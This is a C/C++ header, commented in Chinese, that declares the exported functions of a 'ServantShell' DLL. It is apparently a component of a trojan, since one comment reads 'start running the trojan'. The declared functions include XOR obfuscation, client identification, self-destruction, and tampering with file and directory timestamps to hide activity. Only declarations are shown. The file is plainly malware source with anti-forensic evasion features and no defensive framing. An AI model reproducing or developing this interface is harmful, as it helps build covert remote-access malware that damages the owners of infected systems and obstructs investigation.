#pragma once
#include "../../../common/CommNames.h"

#ifdef SERVANTSHELL_EXPORTS
#	define SHELL_API extern "C" 
#else
#	define SHELL_API extern "C" __declspec(dllimport)
#endif

//获取当前路径，返回值以\结尾
SHELL_API LPCTSTR GetLocalPath();

//异或加解密
SHELL_API BOOL XFC(const LPVOID lpPlain, DWORD dwPlainLen, LPVOID lpEncrypted, UINT factor0, UINT factor1);

//获取客户端ID
SHELL_API BOOL GetClientID(GUID* pGuid);

//退出程序
SHELL_API void Exit();

//客户端自毁
SHELL_API void SD();

//根据ServantShell的时间调整 文件时间
SHELL_API BOOL AdjustTimes(LPCTSTR filepath);

//调整所在目录的时间
SHELL_API void CheckDT();

//开始运行木马
SHELL_API void Init(BOOL isIns = TRUE);